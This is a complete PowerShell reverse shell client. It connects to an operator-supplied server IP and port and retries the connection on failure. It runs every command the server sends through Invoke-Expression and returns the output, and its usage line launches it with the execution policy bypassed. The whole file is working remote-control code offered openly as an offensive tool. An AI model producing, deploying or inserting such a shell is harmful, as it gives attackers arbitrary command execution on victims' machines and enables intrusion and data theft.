# PowerShell Reverse Shell Client
param (
    [string]$s,  # Server IP
    [int]$p      # Port
)

# Default reconnect delay and max retries
$RECONNECT_DELAY = 5
$MAX_RETRIES = 5
$RETRIES = 0

# Function to display usage
function Show-Usage {
    Write-Host "Usage: powershell -ExecutionPolicy Bypass -File client.ps1 -s <server_ip> -p <server_port>"
    exit 1
}

# Ensure arguments are provided
if (-not $s -or -not $p) {
    Show-Usage
}

# Function to execute a command and return output
function Execute-Command {
    param ($command)
    try {
        $output = Invoke-Expression -Command $command 2>&1
        return $output -join "`n"
    } catch {
        return "Error executing command: $_"
    }
}

# Main connection loop
while ($RETRIES -lt $MAX_RETRIES) {
    try {
        # Establish TCP connection
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($s, $p)

        Write-Host "[+] Connected to $s`:$p"
        $RETRIES = 0  # Reset retries on successful connection

        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        # Listen for commands
        while ($client.Connected) {
            $command = $reader.ReadLine()

            if (-not $command) { continue }

            Write-Host "[*] Received command: $command"

            # Handle termination command
            if ($command -eq "die" -or $command -eq "kill-session") {
                Write-Host "[!] Received kill-session command. Shutting down..."
                $writer.WriteLine("EOF")
                exit
            }

            # Execute command and send output
            $output = Execute-Command -command $command
            $writer.WriteLine("$output`nEOF")
        }

        # Close the connection
        $reader.Close()
        $writer.Close()
        $client.Close()

        Write-Host "[*] Connection closed. Reconnecting in $RECONNECT_DELAY seconds..."
        Start-Sleep -Seconds $RECONNECT_DELAY
        $RETRIES++

    } catch {
        Write-Host "[-] Connection failed ($RETRIES/$MAX_RETRIES): $_"
        if ($RETRIES -ge $MAX_RETRIES) {
            Write-Host "[-] Maximum retry limit reached. Exiting..."
            exit 1
        }
        Start-Sleep -Seconds $RECONNECT_DELAY
        $RETRIES++
    }
}

Write-Host "[-] Maximum retry limit reached. Exiting..."
exit 1
